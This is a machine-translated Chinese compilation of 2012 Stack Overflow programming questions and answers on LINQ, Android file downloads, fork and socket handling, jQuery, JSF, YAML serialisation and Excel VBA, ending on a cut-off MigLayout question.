> 赞同：3
> 
> 时间：2012-10-29T16:30:23.720
> 
> 标签：c#, linq, generics

我正在编写一组 LINQ 2 SQL 扩展方法。现在，我有一堆重复的方法，一个在 IEnumerable 集合上工作，另一个在 IQueryable 集合上工作。例如

```
public static IQueryable<X> LimitVisible(this IQueryable<X> items) {
    return items.Where(x => !x.Hidden && !x.Parent.Hidden);
}

public static IEnumerable<X> LimitVisible(this IEnumerable<X> items) {
    return items.Where(x => !x.Hidden && !x.Parent.Hidden);
} 
```

我认为我需要这种重复，因为我希望能够在某些情况下保留 IQueryable 行为，以便将执行推迟到数据库。**这是一个正确的假设还是单个 IEnumerable 方法（加上将输出转换为 IQueryable）有效？**如果我确实需要两者，我不喜欢重复，所以我想使用通用方法将两者结合起来

```
public static T LimitVisible<T>(this T items) where T : IEnumerable<X> {
    return (T)items.Where(x => !x.Hidden && !x.Parent.Hidden);
} 
```

除了我还想为其编写 LimitVisible 函数的 X 以外的类型（比如 Y 和 Z）之外，这是可行的。但我不会写

```
public static T LimitVisible<T>(this T items) where T : IEnumerable<Y> {
    return (T)items.Where(y => !y.Hidden && !y.Parent.Hidden);
} 
```

因为您可以基于泛型重载。我可以将这些方法放在不同的类中，但这似乎不是正确的解决方案。

有什么建议么？也许我做出了不正确的假设，并且首先不需要 IQueryable 特定版本。

**编辑：另一种选择**

这是我过去用来避免重复的另一种模式

```
private static readonly Expression<Func<X, bool>> F = x => !x.Hidden && !x.Parent.Hidden;

public static IEnumerable<X> LimitVisible(this IEnumerable<X> e) {
    return e.Select(W.Compile());
}

public static IQueryable<X> LimitVisible(this IQueryable<X> q) {
    return q.Select(W);
} 
```

这有什么危险吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:38:22.360

真的有两种方法没有好办法。将`IQueryable` `Where`a`Expression<Func<T,bool>>`作为参数，而`IEnumerable`将 a`Func<T,bool>`作为参数。由于 lambdas 的魔力，调用者的代码看起来相同，但编译器实际上对这两个不同的代码位做了截然不同的事情。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:39:40.633

答案取决于您的使用情况：如果您不介意将数据集放入内存以执行查询，那么只保留`IEnumerable<T>`覆盖就可以了。

然而，这个决定的必然结果是你的查询将在你使用的那一刻被强制进入内存`LimitVisible<T>`。这可能是也可能不是您想要的，并且可能会迫使您进入您宁愿避免的编码模式。例如，

```
var firstHundred = ctx
    .SalesOrders
    .LimitVisible()                     // Happens in memory
    .Where(ord => ord.UserId == myUser) // Also happens in memory
    .Take(100); 
```

使用单个`IEnumerable<T>`比使用覆盖的`IQueryable<T>`availalbe 执行得更差，因为*所有*销售订单将在确定它们的可见性之前一个接一个地检索到内存中，而不是检查服务器端的条件。如果按用户 ID 过滤可以消除服务器端的大部分销售订单，那么这个等效查询的性能差异可能会好几个数量级：

```
var firstHundred = ctx
    .SalesOrders
    .Where(ord => ord.UserId == myUser) // Happens in RDBMS
    .LimitVisible()                     // Happens in memory
    .Take(100); 
```

如果您打算只自己使用您的代码，并且您不介意在没有明显原因的情况下出现性能不佳的情况，您可以保持一个过载。如果您打算让其他人使用您的库，我强烈建议保留这两个覆盖。

**编辑：**为了加快您的替代实现，预编译您的表达式，如下所示：

```
private static readonly Expression<Func<X, bool>> F = x => !x.Hidden && !x.Parent.Hidden;
private static readonly Predicate<X> CompiledF = (Predicate<X>)F.Compile();

public static IEnumerable<X> LimitVisible(this IEnumerable<X> e) {
    return e.Select(CompiledF);
}

public static IQueryable<X> LimitVisible(this IQueryable<X> q) {
    return q.Select(F);
} 
```

# android - Android从url下载并显示pdf

> ID：13125757
> 
> 赞同：2
> 
> 时间：2012-10-29T16:30:38.383
> 
> 标签：android

我从聊天中得到一个 .pdf 文件，我想下载它并使用 acrobat 阅读器显示它。以下是我的代码

```
 public void showPDF(String pdf)
        {
            try
            {
                Log.i("pic", "  * * * in showPdf" + pdf);

                String extStorageDirectory = Environment.getExternalStorageDirectory().toString();
                File folder = new File(extStorageDirectory, "pdf");
                folder.mkdir();
                String pdf_name = pdf.replace(".pdf", "");
                pdf_name = pdf_name.replace("/fileupload/data/chat/", "");
                File file = new File(folder, pdf_name + ".pdf");
                try
                {
                    file.createNewFile();
                }
                catch (IOException e1)
                {
                    e1.printStackTrace();
                }
                Log.i("pic", "  * * * ready to download");
                new DownloadFile(file, Functions.getServiceProtocol() + Functions.getServiceDomain() + pdf, pdf_name).execute();
            }
            catch (Exception e)
            {
                Log.i("pic", " CATCH * * * in showPdf");
            }
        }
      } 

  private class DownloadFile extends AsyncTask<String, Integer, String>
        {
            private String fileURL, pdfname;
            private File directory;
            private ProgressDialog dlg = new ProgressDialog(CameraWebview.this);

            public DownloadFile(File d, String f, String n)
            {
                directory = d;
                fileURL = f;
                pdfname = n;
            }

            @Override
            protected String doInBackground(String... sUrl)
            {
                try
                {
                    Log.i("pic", " TRY * * * download file");
                    FileOutputStream f = new FileOutputStream(directory);
                    URL u = new URL(fileURL);
                    HttpURLConnection c = (HttpURLConnection)u.openConnection();
                    c.setRequestMethod("GET");
                    c.setDoOutput(true);
                    c.connect();

                    InputStream in = c.getInputStream();

                    byte[] buffer = new byte[1024];
                    long total = 0;
                    int count;

                    while ((count = in.read(buffer)) != -1) {
                        total += count;
                        f.write(buffer, 0, count);
                    }

                    f.flush();
                    f.close();

                    try
                    {
                         Log.i("pic", " TRY * * * calling displayPdf");
                         displayPdf(pdfname);
                    }
                    catch(Exception ex)
                    {
                        Log.i("pic", " CATCH * * * calling displayPdf");
                    }
                }
                catch (Exception e)
                {
                }
                return null;
            }

            @Override
            protected void onPreExecute()
            {
                super.onPreExecute();
                dlg.setMessage("Downloading File ...");
                dlg.show();
            }

            @Override
            protected void onProgressUpdate(Integer... progress)
            {
                super.onProgressUpdate(progress);
                mProgressDialog.setProgress(progress[0]);
            }

            @Override
            protected void onPostExecute(String result)
            {
                super.onPostExecute(result);
                if (dlg.isShowing())
                    dlg.dismiss();
            }
        }

      public void displayPdf(String pdf_name)
        {
            try
            {
                Log.i("pic", " TRY * * * ready to show pdf");
                File file = new File(Environment.getExternalStorageDirectory() + "/pdf/" + pdf_name + ".pdf");
                PackageManager packageManager = getPackageManager();
               Intent testIntent = new Intent(Intent.ACTION_VIEW);
                testIntent.setType("application/pdf");
                List list = packageManager.queryIntentActivities(testIntent, PackageManager.MATCH_DEFAULT_ONLY);
                Intent intent = new Intent();
                intent.setAction(Intent.ACTION_VIEW);
                Uri uri = Uri.fromFile(file);
                intent.setDataAndType(uri, "application/pdf");
                startActivity(intent);
                Log.i("pic", " TRY * * * here is the pdf");
            }
            catch (Exception e)
            {
                Log.i("pic", " CATCH * * * show pdf file" + e.toString());
            } 
```

它总是说“文件损坏”。我检查了我正在使用的网址，这很好。我的应用程序也是冰淇淋三明治。我究竟做错了什么 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T17:54:11.733

您在 setRequestMethod("GET") 之后使用 setDoOutput(true)。

setDoOutput(true) 将您的请求方法自动设置为 POST。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:39:34.107

调用时`DownloadFile(File d, String f, String n)`，如何获取目录？

如果您使用的是`getExternalStorageDirectory`（我假设您是），则该 pdf 对您的应用程序是私有的，其他应用程序无法访问。

如果您需要将该文件保密给您的应用程序，并且仍然能够使用另一个应用程序打开，请使用[`ContentProvider`](http://developer.android.com/guide/topics/providers/content-provider-creating.html)

如果您可以将该文件保存在共享目录中，则应使用[`getExternalStoragePublicDirectory()`](http://developer.android.com/guide/topics/data/data-storage.html#filesExternal)获取保存文件的路径，然后检索文件 URI。

这个问题与这个问题有关[，](https://stackoverflow.com/questions/13015233/the-size-of-pdf-is-shown-0-when-attached-to-gmail/13015944#13015944)因此有类似的答案。

这应该可以解决问题：

内部`showPDF`：

```
String extStorageDirectory = Environment.getExternalStoragePublicDirectory(
        Environment.DIRECTORY_DOWNLOADS).toString(); 
```

里面`displayPdf`

```
File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + "/pdf/" + pdf_name + ".pdf"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T17:59:46.167

```
 theurl = new URL(url);                       
                        InputStream in = null;
                        File dst = new File(Environment.getExternalStorageDirectory()+"/file.pdf");
                            try {
                                in = theurl.openStream();
                            } catch (IOException e) {
                                // TODO Auto-generated catch block
                                e.printStackTrace();
                            }               
                            OutputStream out = null;
                        try {
                            out = new FileOutputStream(dst);
                        } catch (FileNotFoundException e) {
                            // TODO Auto-generated catch block
                        }
                             // Transfer bytes from in to out
                             try {
                                byte[] buf = new byte[100000];
                                int len;
                            while ((len = in.read(buf)) > 0) {
                              out.write(buf, 0, len);
                             }
                        } catch (IOException e) {
                            // TODO Auto-generated catch block
                            e.printStackTrace();
                        }
                             try {
                            in.close();
                        } catch (IOException e) {
                            // TODO Auto-generated catch block
                            e.printStackTrace();
                        }
                             try {
                            out.close();
                        } catch (IOException e) {
                            // TODO Auto-generated catch block
                            e.printStackTrace();
                        } 
```

# c++ - 分叉的进程一直在监听服务器的端口

> ID：13125758
> 
> 赞同：1
> 
> 时间：2012-10-29T16:30:47.443
> 
> 标签：c++, c, posix, fork, port

这是我用于执行命令的代码的轻量级版本：

```
void close_all_nonestandard_fds()
{
    struct rlimit fds_limit;
    int max_fd = 1024;
    if (getrlimit(RLIMIT_NOFILE, &fds_limit) == 0) max_fd = fds_limit.rlim_cur;
    for(int i = 0; i <= max_fd; ++i) {
        if(i != STDERR_FILENO && i != STDOUT_FILENO && i != STDIN_FILENO) close(i);
    }
}

void exec_command(char* command, char*const* args)
{
    pid_t pid = fork();
    if(pid != 0)
    {
        if(pid == -1) throw_error("Failed to fork: %s", strerror(errno));
        // Parent
    }
    else
    {
        // Child
        close_all_nonestandard_fds();
        if(execv(command, args) == -1) throw_error("Failed to execv: %s", trerror(errno));
    }
} 
```

该`exec_command`方法在我的服务器端应用程序中用于运行不同类型的进程，包括守护进程。但是在这里我注意到一个问题：

当服务器运行一个子守护进程时，它（服务器）被杀死或崩溃，子进程开始监听服务器正在监听的端口。

那么，如何执行命令并确保它不会在服务器结束（崩溃、死亡）后保持服务器端口繁忙？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:47:06.727

*只需通过存储它们*来跟踪所有服务器套接字，然后在`fork()`ing 之后将这些`close()`d 放入孩子中。

这些是`listen()`ing 套接字和`accept()`ed 套接字。

* * *

**更新：**

您也可能想使用`setsockopt()`将选项设置为`SO_REUSEADDR`传递给的套接字`bind()`

> SO_REUSEADDR
> 
> 表示用于验证 bind(2) 调用中提供的地址的规则应该允许重用本地地址。对于 AF_INET 套接字，这意味着一个套接字可以绑定，除非有一个活动的侦听套接字绑定到该地址。当侦听套接字使用特定端口绑定到 INADDR_ANY 时，就不可能为任何本地地址绑定到该端口。参数是一个整数布尔标志。

# c# - 奇怪的 HTML 表格问题，第一行标签消失了

> ID：13125759
> 
> 赞同：0
> 
> 时间：2012-10-29T16:30:49.257
> 
> 标签：c#, html, forms, html-table

我在使用 C# 生成 HTML 表时遇到问题。在每一行上，我都有一个删除按钮，用于从数据库中删除该行。

但是它似乎不适用于第一行，我发现问题是第一行周围没有 -tag，我不知道为什么。

我正在使用类似下面的代码来生成表格：

```
// Initalize SQL connection...
string resp = ""; // Response string, used to build the html

resp += "<table id='hor-minimalist-b' summary='Product list'>";

// Display the column names as headers
resp += "<thead><tr>";
resp += "<th scope='col'>Artikel</th>";
// Use empty headers for button columns
resp += "<th scope='col'></th>"; // Remove button
foreach (DataColumn dc in ds.Tables[0].Columns)
{
    resp += "<th scope='col'>" + dc.ColumnName + "</th>";
}
resp += "</tr></thead>";

// Display the data for each row. Loop through the rows first.
resp += "<tbody>";
foreach (DataRow dr in ds.Tables[0].Rows)
{
    resp += "<tr>";
    // Then loop through the columns for the current row print them
    string artID = getArticleID(dr); // Get the primary key for row
    for (i = 1; i <= ds.Tables[0].Columns.Count; i++)
    {
        // Add additional buttons
        if (i == 2)
        {
            // Add remove button
            resp += "<td>";
                resp += "<form method='post' action='Default.aspx'>";
                    resp += "<input type='hidden' name='action' value='deleteRow' />";
                    resp += "<input type='hidden' name='rowID' value='" + artID + "' />";
                    resp += "<input type='submit' value='Ta bort' onclick=\"return confirm('Är du säker på att du vill ta bort artikel " + artID + "');\" />";
                resp +="</form>";
            resp +="</td>";
        }

        resp += "<td>" + dr[i - 1] + "</td>";
    }
    resp += "</tbody>";
    resp += "</table>";
} 
```

最终结果类似于以下 HTML：

```
<table id="hor-minimalist-b" summary="Product list">
    -
    <thead>
        -
        <tr>
            ...
        </tr>
    </thead>
    -
    <tbody>
        -
        <tr>
            <td id="val15462_0">
                15462
            </td>
            -
            <td>
                -
                <form method="post" action="Default.aspx">
                <input type="hidden" name="action" value="deleteRow" />
                <input type="hidden" name="rowID" value="15462" />
                <input type="submit" value="Ta bort" onclick="return confirm('Är du säker på att du vill ta bort artikel 15462');" />
                </form>
            </td>
            -
            <td>
                <input value="Ändra" type="button" onclick="editArt(15462)" />
            </td>
            <td id="val15462_1">
                AX-10.535
            </td>
            <td id="val15462_3">
                Detaljspecifikt värde A
            </td>
            <td id="val15462_4">
                Detaljspecifikt värde B
            </td>
            <td id="val15462_2">
                kitten2.jpeg
            </td>
        </tr>
        -
        <tr>
            <td id="val15463_0">
                15463
            </td>
            -
            <td>
                -
                <form method="post" action="Default.aspx">
                <input type="hidden" name="action" value="deleteRow" />
                <input type="hidden" name="rowID" value="15463" />
                <input type="submit" value="Ta bort" onclick="return confirm('Är du säker på att du vill ta bort artikel 15463');" />
                </form>
            </td>
            -
            <td>
                <input value="Ändra" type="button" onclick="editArt(15463)" />
            </td>
            <td id="val15463_1">
                AX-10.536
            </td>
            <td id="val15463_3">
                Detaljspecifikt värde A
            </td>
            <td id="val15463_4">
                Detaljspecifikt värde
            </td>
            <td id="val15463_2">
                kitten3.jpg
            </td>
        </tr>
        ...
    </tbody>
</table> 
```

注意第一行周围没有表单标签。而且我真的不确定是什么原因造成的。

**更新：** 我更正了上面的 HTML，它没有正确粘贴。现在粘贴的是从构建 HTML 的服务器函数返回的字符串，它*确实*包含表单标记（从 VS 中的 XML 可视化器可以看出，所以不要介意 - 的）。

但是，当我使用浏览器调试网站时，表单标签不会出现在第一个数据行中，如下所示：

```
<td>
  <input type="hidden" name="action" value="deleteRow"/>
  <input type="hidden" name="rowID" value="15462"/>
  <input type="submit" value="Ta bort" onclick="return confirm('Är du säker på att du vill ta bort artikel 15462');"/>
</td> 
```

由于存在狂野的输入，这弄乱了我网站的其他部分

感谢您的宝贵时间，我将不胜感激任何建议！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-30T10:01:38.763

通过使用JS在页面的其他部分提交隐藏表单而不是在表格中包含表单来解决它。

# facebook - 我们可以使用通知 API 向我们的客户发送消息吗？

> ID：13125761
> 
> 赞同：0
> 
> 时间：2012-10-29T16:30:54.203
> 
> 标签：facebook, notifications

我们想开发一个 Facebook 应用程序来向我们自己的客户发送通知。我们想向客户发送有关他们在我们核心系统中的交易的私人消息。通知是正确的方法吗？另外，有没有其他选择？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:40:15.447

一般来说，是的。Facebook 有一个通知 API，供应用程序向用户发送通知。有一些限制，所以我建议查看文档以了解它是否可以做什么，以及它的功能是否符合您希望应用程序执行的操作：

[https://developers.facebook.com/docs/app-notifications/](https://developers.facebook.com/docs/app-notifications/)

# android - 截至目前（2012 年 10 月）Google Play 商店接受提交的应用程序需要多长时间？

> ID：13125768
> 
> 赞同：-1
> 
> 时间：2012-10-29T16:31:19.913
> 
> 标签：android, google-play

正如标题所说，

截至目前（2012 年 10 月）Google Play 商店接受提交的应用程序需要多长时间？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:44:52.927

我上周末提交了一个应用程序，一个小时内就可以在 Google Play 商店中看到它。

# hpc - 区分 HPL 在 N、NB、PxQ 不变的情况下运行

> ID：13125774
> 
> 赞同：1
> 
> 时间：2012-10-29T16:31:41.627
> 
> 标签：hpc

我正在使用高性能 Linpack 2.0 对我的计算集群进行基准测试。我刚刚完成了 16 次运行，其中某些调整参数会有所不同，但其他的则不会。特别是，输出中的 FLOPS 分数列出的四个参数（`N`、`NB`、`P`和`Q`）没有变化。因此，我不知道如何根据那些变化的参数（`PFACT`、`RFACT`、`BCAST`和`DEPTH`）来区分结果。

有问题的 HPL 输出可以在[这里找到](https://docs.google.com/document/d/1-65tlH-mjjVYgpq5GIHLDLAyv2pwFEGSZouS-O_QYBA/edit)

对应的[输入文件](https://docs.google.com/document/d/1iLyU_ErfkUoiGf5VzqmvN2tXBthzXj38DQMO7fndQvc/edit)

任何见解或想法表示赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-30T13:18:06.563

每次运行的参数都编码在`T/V`字段的值中，例如

```
WR00L2L4
 |||||||
 ||||||+-- NBMIN = 4
 |||||+--- PFACT = Left
 ||||+---- NDIV = 2
 |||+----- RFACT = Left
 ||+------ BCAST = 0 (1ring)
 |+------- DEPTH = 0
 +-------- possibly PMAP = Row-major 
```

参数值从最后一个开始旋转。当所有可能的值都被测试时，前一个的值被改变等等。

# geometry - 根据 lat/lng 确定点到另一点的距离和位置

> ID：13125776
> 
> 赞同：0
> 
> 时间：2012-10-29T16:31:46.200
> 
> 标签：geometry, latitude-longitude

给定 2 个点（point1 和 point2）及其纬度/经度，

如何判断 point2 是在 point1 的上方还是下方，在 point1 的右侧还是左侧？我将如何计算 2 点之间的角度（图像中的 alpha）？

![在此处输入图像描述](../Images/5775ee5a3ae813bd23625a6b81905c9d.png)

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T18:06:40.787

这更像是一个扩展评论而不是一个答案，但它可能会为您指明正确的方向（哈哈，无法抗拒）。

在为自己设计此类问题时，您必须非常小心。首先，您是否关心考虑地球的（近似）球形度，或者您是一个粗暴的老混蛋，会满足于将地球表面视为一个平面？

如果是前者，请将您的注意力引向[这个网页](http://www.movable-type.co.uk/scripts/latlong.html)，这可能是关于如何计算球体上的距离和方位角的最相关的解释。请注意，正如该页面所解释的，从点 1 到点 2 的线的方位角（您称之为角度）沿线不断变化。正如您将发现的那样，那条线是一个大圆圈的一部分。只有当连接两点的大圆恰好穿过两极，或者更不可能穿过赤道时，目的地与您当前位置的方位才不会连续变化。

还要注意，很容易构造点 2 从点 1 的初始方位在东方以北，而从点 1 到点 2 的大圆的最终方位在东方以南的情况，因此使用初始方位作为两个点的相对位置的指标可能很棘手。

如果您是扁平地球人，并且它是短距离导航（可能长达 60 海里或 100 公里）的完美选择，那么请拿出您的小学几何书，将纬度和经度视为平面度量。如果您仍然遇到问题，请编辑您的问题。

# yaml - YAML，delayed_job：Psych 与 Syck。如何让 pysch 读取 ruby 对象的 attr_accessors

> ID：13125777
> 
> 赞同：2
> 
> 时间：2012-10-29T16:31:45.450
> 
> 标签：yaml, ruby-1.9.3, psych, syck

我在使用带 ruby​​ 1.9.3 的延迟作业（3.0.3）时遇到问题。以前我们使用的是 ruby​​ 1.8.7，它带有 yaml syck 解析器，它读取为 ruby​​ 对象（包括 attr_accessors）设置的所有属性，但升级到 1.9.3 后，yaml 解析器切换到 psych（重新写的）并且它不考虑除了数据库中持久化的属性之外的任何属性。我们怎样才能让心理也考虑到 attr_accessors。我试图通过以下方式切换到 syck：

```
YAML::ENGINE.yamler = 'syck' 
```

但还是不行。

有没有人可以解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T14:27:43.653

上面的 hack 不起作用，但我们只需要覆盖 ActiveRecord::Base 的 encode_with 和 init_with 方法以包含属性访问器。更准确地说，我们需要使用 att_accessors 设置编码器哈希，这会处理实例变量的持久性。

有趣的阅​​读：[https ://gist.github.com/3011499](https://gist.github.com/3011499)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T01:40:22.587

delay_job 反序列化器不会在加载的 ActiveRecord 对象上调用 init_with。

这是延迟作业的猴子补丁，它确实在结果对象上调用了 init_with：[https ://gist.github.com/4158475](https://gist.github.com/4158475)

例如，对于那个猴子补丁，如果我有一个名为 Artwork 的模型，具有额外的属性路径和深度：

```
class Artwork < ActiveRecord::Base
  def encode_with(coder)
    super

    coder['attributes']['path'] = self['path']
    coder['attributes']['depth'] = self['depth']
  end

  def init_with(coder)
    super

    if coder['attributes'].has_key? 'path'
      self['path'] = coder['attributes']['path']
    end

    if coder['attributes'].has_key? 'depth'
      self['depth'] = coder['attributes']['depth']
    end

    self
  end
end 
```

# javascript - jquery淡出，淡入，等待，淡入再次破碎

> ID：13125781
> 
> 赞同：0
> 
> 时间：2012-10-29T16:32:09.367
> 
> 标签：javascript, jquery, settimeout

我正在尝试存储一个 div 的内容，暂时显示一条感谢信息，然后放回 div 的原始内容。由于某些（可能是很多）原因，它失败了，我不知道为什么。我做错了什么？

```
$('#btn').on('click', function() {
    //store original content
    //appears to be a text string, rather than a jquery object
    var content = $('#container').html();
    console.log(content);
    $('#container').children().fadeOut(800, function() {
        $('#container').html('<div id="thanks">Thanks!</div>', function() {
            $('#thanks').fadeIn(800, function() {

                var t=setTimeout(function(){$('#container').html(content)},3000)

            });
        });
    });
});​ 
```

[http://jsfiddle.net/gaZCW/](http://jsfiddle.net/gaZCW/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:33:39.780

[html](http://api.jquery.com/html/)函数只接受一个参数。所以你的回调不会被调用。

我检查[了来源](http://code.jquery.com/jquery-latest.js)以确保：

```
html: function( value ) { 
```

你可以这样做：

```
$('#container').html('<div id="thanks">Thanks!</div>');
$('#thanks').fadeIn(800, function() {
     var t=setTimeout(function(){$('#container').html(content)},3000)
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:40:19.277

html函数是同步的......不需要回调：http: [//jsfiddle.net/gaZCW/10/](http://jsfiddle.net/gaZCW/10/)

```
$('#container').children().fadeOut(800, function() {
    $('#container').html('<div id="thanks">Thanks!</div>');
    $('#thanks').fadeIn(800, function() {
        $(this).delay(3000).fadeOut(800, function() {
            $('#container').html(content).children().hide().fadeIn(800);
        });
    });
}); 
```

此外，`delay`在这种情况下，将比设置超时更简洁（更简洁）。

# jsf - 如何检测当前的 JSF 版本？

> ID：13125782
> 
> 赞同：27
> 
> 时间：2012-10-29T16:32:13.733
> 
> 标签：jsf, version, detection

我正在开发一个 jsf-webapp，现在我需要知道我使用的是什么 JSF 版本？我在哪里可以查到这个？提前致谢。

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-10-29T16:36:58.047

以编程方式，你的意思是？你可以从[`Package#getImplementationVersion()`](http://docs.oracle.com/javase/6/docs/api/java/lang/Package.html#getImplementationVersion%28%29).

```
String version = FacesContext.class.getPackage().getImplementationVersion(); 
```

顺便也有[`getImplementationVendor()`](http://docs.oracle.com/javase/6/docs/api/java/lang/Package.html#getImplementationVendor%28%29)和[`getImplementationTitle()`](http://docs.oracle.com/javase/6/docs/api/java/lang/Package.html#getImplementationTitle%28%29)方法。您可能还想使用它来区分供应商（例如 MyFaces 或 Mojarra）。

还是你的意思是手动？只需查看`/META-INF/MANIFEST.MF`JSF impl JAR 文件的文件即可。您可以使用 ZIP 工具提取 JAR 文件。这是`Implementation-Version`清单文件的条目。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-11-21T10:56:58.803

对我来说，它不适用于**WebSphere Server**，所以我遵循了peater 的[评论](https://stackoverflow.com/questions/13125782/how-to-detect-current-jsf-version#comment34884636_13125869)：

```
System.out.println("JSF API Location: " + FacesContext.class.getProtectionDomain().getCodeSource());
System.out.println("JSF Impl Location: " + Facelet.class.getProtectionDomain().getCodeSource()); 
```

它向我显示了库文件名中的版本：

JSF API 位置：（文件：/C: **/workspaces/spielwiese/wlp/dev/api/spec/com.ibm.websphere.javaee.jsf.2.2_1.0.18** .jar）

JSF Impl 位置：（文件：/C: **/workspaces/spielwiese/wlp/dev/api/spec/com.ibm.websphere.javaee.jsf.2.2_1.0.18** .jar）

* * *

## 回答 #3

> 赞同：-4
> 
> 时间：2018-05-15T15:25:05.827

**脚步**

1：解压javax.faces.jar（解压到文件夹），解压文件夹\META-INF

2：在 META-INF 中，打开 MANIFEST.MF。

3：搜索实现版本

例如：**实施版本：2.1.6-SNAPSHOT**

# excel - 按月和年过滤excel电子表格

> ID：13125788
> 
> 赞同：0
> 
> 时间：2012-10-29T16:32:43.047
> 
> 标签：excel, vba, filter, autofilter

所以我需要找到每年每个月的最高价格和最低价格。

```
Sub Anaylze()
Dim datemonthcount As Long
Dim dateyearcount As Long
Dim yearcount As Long
Dim month As Long
Dim yearstart As Long
Dim maxprice As Long
Dim minprice As Long
Dim rowprice As Long
Dim percentchange

Dim counterlong As Integer

rowprice = 1
yearstart = 2002
counterlong = 0

    Range("A1").Select
    Do Until IsEmpty(ActiveCell) Or ActiveCell.Value = 0 Or IsNumeric(ActiveCell) = False
        counterlong = counterlong + 1 'Increments the counter
         If year(ActiveCell.Text) <> year((ActiveCell.Offset(-1, 0).Text)) Then
         dateyearcount = dateyearcount + 1
         End If
         ActiveCell.Offset(1, 0).Select ' Step down 1 row from present location.
    Loop

    For yearcount = 0 To dateyearcount
    For month = 1 To 12
    'Range("A1", "B" & counterlong).AutoFilter Field:=1, Criteria1:=">=" & month & "/01/" & yearstart, Operator:=xlAnd, Criteria2:="<=" & month & "/31/" & yearstart
    maxprice = WorksheetFunction.Max(Range("A1", "B" & counterlong).AutoFilter(Field:=1, Criteria1:=">=" & month & "/01/" & yearstart, Operator:=xlAnd, Criteria2:="<=" & month & "/31/" & yearstart))
    minprice = WorksheetFunction.Min(Range("A1", "B" & counterlong).AutoFilter(Field:=1, Criteria1:=">=" & month & "/01/" & yearstart, Operator:=xlAnd, Criteria2:="<=" & month & "/31/" & yearstart))
    Cells(rowprice, "g") = maxprice
    Cells(rowprice, "h") = minprice
    rowprice = rowprice + 1 
    Next
    yearstart = yearstart + yearcount
    Next

End Sub 
```

我最大的问题是试图让过滤器工作，我的数据以这种方式格式化

```
2012 年 10 月 26 日 61.66
2012 年 10 月 25 日 61.6
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T21:57:54.893

是的，正如 Nutsch 指出的那样——最简单的方法可能是使用数据透视表：

首先，您可以将日期拆分为月、日、年： ![例如1](../Images/0c9edb06b3e1ec17da8a9db16d31d54f.png)

然后您可以调整您的数据透视表值字段设置： ![例2](../Images/89b1d1c2b8ae9ac193018b8d6cf41031.png)

![例如3](../Images/cf1a2e92376e60236696e2e245c6aae3.png)

***编辑/添加***

因此，既然你改变了你的问题 - 这就是我将如何做你在评论中所说的：

```
=MAX(IF($B$2:$B$22=(B2-1),$E$2:$E$22)) 
```

这是一个数组公式，您可以使用 control-alt-delete 输入。

![例4](../Images/e1eaa49352d638a653552083facb5b1b.png)

![例5](../Images/0f5c57141a6cb92877e5309fa25154c5.png)

![例6](../Images/3fc3e129aff742767d85d1a52b8a3567.png)

然后你可以随心所欲地总结这些数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T10:56:38.077

我认为 Stepan1010 的答案是正确的，但是如果您想要自定义 VBA 代码，这里是供您参考的代码

```
Sub testing()
    Dim dataArray As Variant ' contains  DATE,VALUE
    Dim intArray As Variant ' contains uniqute identifer MM-YYYY,has operation or not ( BOOLEAN)
    Dim resultArray As Variant ' contains the min/max value, and min / max of the previous month
    Dim min As Double
    Dim max As Double
    With ActiveSheet
        Height = .Cells(.Rows.Count, 1).End(xlUp).Row
        If Height < 2 Then
            MsgBox "Are you sure there's only 1 line or 0 line of data and still want to process?"
            Exit Sub
        End If

        'FIRST SORT THE DATA BY date ascending order
        Application.CutCopyMode = False
        .Sort.SortFields.Clear
        .Sort.SortFields.Add Key:=Range("A1:A" & Height), _
            SortOn:=xlSortOnValues, Order:=xlAscending, DataOption:=xlSortNormal
        With .Sort
            .SetRange Range("A1:B" & Height)
            .Header = xlGuess
            .MatchCase = False
            .Orientation = xlTopToBottom
            .SortMethod = xlPinYin
            .Apply
        End With
        ReDim dataArray(1 To Height, 1 To 2)
        ReDim intArray(1 To Height, 1 To 2)
        ReDim resultArray(1 To Height, 1 To 3)
        dataArray = .Range(.Cells(1, 1), .Cells(Height, 2)).Value
        For i = LBound(intArray, 1) To UBound(intArray, 1)
            intArray(i, 1) = Month(dataArray(i, 1)) & "-" & Year(dataArray(i, 1))
            intArray(i, 2) = False
        Next i

        lastMax = 1
        For i = LBound(dataArray, 1) To UBound(dataArray, 1)
            If Not intArray(i, 2) Then ' not yet found
                    min = dataArray(i, 2)
                    max = dataArray(i, 2)
                For j = i To UBound(dataArray, 1) ' loop later elements
                    If intArray(j, 1) = intArray(i, 1) Then ' if same MM-YYYY
                        If dataArray(j, 2) < min Then
                            min = dataArray(j, 2)
                        End If

                        If dataArray(j, 2) > max Then
                            max = dataArray(j, 2)
                        End If

                        intArray(j, 2) = True 'mark as found(operated)
                    End If
                Next j

                resultArray(i, 1) = min
                resultArray(i, 2) = max

                If i = 1 Then
                    resultArray(i, 3) = 0
                Else
                    resultArray(i, 3) = (min / lastMax) * 100
                End If
                If resultArray(i, 2) > 0 Then
                    lastMax = resultArray(i, 2)
                End If
            End If
        Next i

        ' YOU CAN CHANGE THE VALUE  3 ,5  to the column you prefer
        .Range(.Cells(1, 3), .Cells(Height, 5)).Value = resultArray

    End With
End Sub 
```

# java - 如何消除 MigLayout 中两个单元格之间的垂直间隙？

> ID：13125789
> 
> 赞同：3
> 
> 时间：2012-10-29T16:32:43.733
> 
